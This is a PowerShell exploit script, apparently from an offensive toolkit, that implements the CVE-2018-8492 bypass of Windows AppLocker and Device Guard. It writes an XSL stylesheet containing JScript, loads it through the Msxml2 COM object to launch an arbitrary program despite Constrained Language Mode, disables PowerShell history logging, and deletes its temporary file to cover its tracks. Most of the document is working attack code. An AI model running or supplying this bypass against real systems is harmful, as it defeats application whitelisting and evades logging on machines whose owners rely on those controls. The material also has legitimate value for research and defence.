<#
.SYNOPSIS
   CVE-2018-8492 - Application Whitelisting Bypass {XML}

   Author: @bohops|@r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Msxml2 -com Object {native}
   Optional Dependencies: none
   PS cmdlet Dev version: v1.1.8

.DESCRIPTION
   AppLockerXml.ps1 module Checks\Exploits CVE-2018-8492 security bypass vulnerability in
   Windows Device Guard that could allow an attacker to inject malicious code into a Windows
   PowerShell session. (Device Guard Code Integrity Policy Security Feature Bypass Vulnerability)

   AppLocker supports file hash, path, and publisher rules for scripts and applications (exe, dll,
   appx, etc.) as well as an audit mode for testing rules.  Of note, AppLocker places PowerShell
   in Constrained Language Mode (CLM) for unprivileged users when policies are enforced, which
   restricts unapproved script execution, cmdlets, arbitrary types and type definitions.

.NOTES
   A TimeOpen of '0' (seconds) maitains the executed application open!
   Affected: Windows Server 2016, Windows 10, Windows Server 2019, Windows 10 Servers.

.Parameter Action
   Accepts argument: XmlBypass

.Parameter Execute
   The appl Name OR the appl to execute absoluct path! (default: cmd.exe)

.Parameter TimeOpen
   The TimeOut to maintain the application open! (default: 1 seconds)

.EXAMPLE
   PS C:\> Get-Help .\AppLockerXml.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\AppLockerXml.ps1 -Action XmlBypass -Execute "$PSHome\Powershell.exe"
   Checks if PS $ExecutionContext its set to 'ConstrainedLanguage'. If 'Constrained'..
   Execute 'powershell.exe' trougth CVE-2018-8492 Windows Device Guard XML bypass technic!

.EXAMPLE
   PS C:\> .\AppLockerXml.ps1 -Action XmlBypass -Execute "cmd.exe" -TimeOpen 5
   Checks if PS $ExecutionContext its set to 'ConstrainedLanguage'. If 'Constrained'..
   Execute 'cmd.exe' through CVE-2018-8492 XML bypass technic and close it after 5 seconds!

.INPUTS
   None. You cannot pipe objects into AppLockerXml.ps1

.OUTPUTS
   [INFO] Windows Device Guard!
   ----------------------------------------
   AffectedOSflavor    : true
   ConstrainedLanguage : enabled
   ExecuteAppl         : cmd.exe
   ApplTimeOpen        : 1 seconds
      
   [XML] CVE-2018-8492 bypass!
   -----------------------------------------
   writting yUeInzP.xml to %tmp% directory!
   creating Msxml2 COM Object to load xml file!
   trying to execute yUeInzP.xml stylesheet file!

   ScanResults         : XML successfully executed application!

.LINK
   https://github.com/r00t-3xp10it/redpill
   https://bohops.com/2019/05/04/abusing-catalog-file-hygiene-to-bypass-application-whitelisting
   https://bohops.com/2019/01/10/com-xsl-transformation-bypassing-microsoft-application-control-solutions-cve-2018-8492
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Execute="cmd.exe",
   [string]$TimeOpen='false',
   [string]$Action="false"
)


Write-Host ""
$OSMajor = [environment]::OSVersion.Version.Major
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null


If($Action -ieq "False"){## [error] none parameters sellected by cmdlet user!
   Write-Host "[error] This cmdlet requires the use of -Parameters to work!" -ForeGroundColor Red -BackGroundColor Black
   Start-Sleep -Seconds 2;Get-Help .\AppLockerXml.ps1 -Detailed
   exit ## Exit @AppLockerXml
}

If($OSMajor -NotMatch '(10|2016|2019)'){## [error] wrong OS flavor detected!
   Write-Host "[error] This cmdlet requires 'Windows (10|2016|2019) build' to work!" -ForeGroundColor Red -BackGroundColor Black
   Start-Sleep -Seconds 2;Get-Help .\AppLockerXml.ps1 -Full
   exit ## Exit @AppLockerXml
}


If($Execute -Match '\\'){## Parse User -Execution Input Data!
   $Data = $Execute -replace '\\','\\'     ## C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
   $Pars = $Execute.Split('\\')[-1]        ## powershell.exe
   $StopProc = $Pars -replace '.exe',''    ## powershell
   $Execute = $Data
}ElseIf($Execute -Match '^(calc.exe)$'){
   $Pars = "$Execute"                      ## calc.exe
   $StopProc = "Calculator"                ## Calculator
}Else{
   $Pars = "$Execute"                      ## cmd.exe
   $StopProc = $Execute -replace '.exe','' ## cmd
}


## XML Bypass Script CDATA!
$CDATA = @("<?xml version=`"1.0`"?>
<stylesheet xmlns=`"http://www.w3.org/1999/XSL/Transform`" xmlns:ms=`"urn:schemas-microsoft-com:xslt`" xmlns:user=`"placeholder`" version=`"1.0`">
<output method=`"text`"/>
	<ms:script implements-prefix=`"user`" language=`"JScript`">
	<![CDATA[
	var r = new ActiveXObject(`"WScript.Shell`").Run(`"$Execute`");
	]]> </ms:script>
</stylesheet>")


If($Action -ieq "XmlBypass"){

   <#
   .SYNOPSIS
      Author: @bohops|@r00t-3xp10it
      Helper - Application Whitelisting Bypass {XML}

   .DESCRIPTION
      This function bypass Windows Device Guard Application Whitelisting Execution
      through CVE-2018-8492 @bohops XML COM object transformation bypass technic!
      
   .OUTPUTS
      [INFO] Windows Device Guard!
      ----------------------------------------
      AffectedOSflavor    : true
      ConstrainedLanguage : disabled
      
      [XML] CVE-2018-8492 bypass!
      -----------------------------------------
      ScanResults         : none CLM restrictions found active!   
   #>


   ## Local function variable declarations
   If($TimeOpen -ieq 'false'){$TimeOpen = '1'}
   $CVEState = $ExecutionContext.SessionState.LanguageMode


   ## Build Output Table
   Write-Host "`n[INFO] Windows Device Guard!" -ForegroundColor Green
   Write-Host "----------------------------------------"
   Write-Host "AffectedOSflavor    : true"


   ## Check ExecutionContext vulnerability state!
   # If($CVEState -iNotMatch '^(FullLanguage)$'){
   If($CVEState -iNotMatch '^(ConstrainedLanguage)$'){
      Write-Host "ConstrainedLanguage : disabled" -ForegroundColor Yellow
      Write-Host "";Start-Sleep -Milliseconds 700
      Write-Host "[XML] CVE-2018-8492 bypass!"
      Write-Host "----------------------------------------";Start-Sleep -Milliseconds 700
      Write-Host "ScanResults          : none CLM restrictions found active!" -ForegroundColor Green -BackGroundColor Black
      Write-Host "";exit ## Exit @AppLockerXml
   }


   ## Apend Data to Output Table
   Write-Host "ConstrainedLanguage : enabled"
   Write-Host "ExecuteAppl         : $Pars"
   Write-Host "ApplTimeOpen        : $TimeOpen seconds`n"
   Start-Sleep -Milliseconds 700
   Write-Host "[XML] CVE-2018-8492 bypass!"
   Write-Host "----------------------------------------"


   ## Create XML script in %tmp% directory!
   $RandomMe = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
   Write-Host "writting $RandomMe.xml to %tmp% directory!";Start-Sleep -Seconds 1
   echo "$CDATA" | Out-File "$Env:TMP\$RandomMe.xml" -Encoding ascii -Force

   ## Test if XML script was successfuly created!
   If(-not(Test-Path -Path "$Env:TMP\$RandomMe.xml" -EA SilentlyContinue)){
      Write-Host "[error] AppLockerXml failed to create $RandomMe.xml in %tmp%" -ForegroundColor Red -BackgroundColor Black
      Write-Host "";exit ## Exit @AppLockerXml
   }


   ## Proof-of-Concept XML Script Execution
   # Disclosure By: @bohops - CVE-2018-8492
   Write-Host "creating Msxml2 COM Object to load xml file!"
   Start-Sleep -Seconds 1

   $MSXML = New-Object -Com Msxml2.DOMDocument.6.0
   $MSXML.load("$Env:TMP\$RandomMe.xml")|Out-Null
   $MSXML.setProperty("AllowXsltScript",$true)

   Write-Host "trying to execute $RandomMe.xml stylesheet file!"
   $MSXML.transformNode($MSXML)|Out-Null;Start-Sleep -Seconds 1

   try{

      ## Check if sellected application was successfully executed!
      $CheckApplState = (Get-Process -Name "$StopProc" -EA SilentlyContinue).Responding |
         Select-Object -Last 1

   }catch{}


   Start-Sleep -Seconds 1
   If($CheckApplState -ieq "True"){## Executed application output table!
      Write-Host "`nScanResults          : XML successfully executed application!" -ForegroundColor Green -BackGroundColor Black
   }Else{## NOt executed application output teble!
      Write-Host "`nScanResults          : XML failed to execute application!" -ForegroundColor Red -BackgroundColor Black
   }


   If($TimeOpen -ne '0'){## Close appl after -TimeOpen reached!
      If(-not($TimeOpen -eq 1)){Start-Sleep -Seconds $TimeOpen}
      If($StopProc -iNotMatch '(powershell)$'){## Stops only process NOT matching powershell!
         Stop-Process -Name $StopProc -Force -EA SilentlyContinue
      }
   }
      
   ## Delete artifacts left behind! 
   Remove-Item -Path "$Env:TMP\$RandomMe.xml" -ErrorAction SilentlyContinue -Force

}Else{

   Write-Host "[error] Bad -Parameter [$Action] input sellection!" -ForeGroundColor Red -BackGroundColor Black
   Start-Sleep -Seconds 2;Get-Help .\AppLockerXml.ps1 -Examples
   exit ## Exit @AppLockerXml

}

Write-Host ""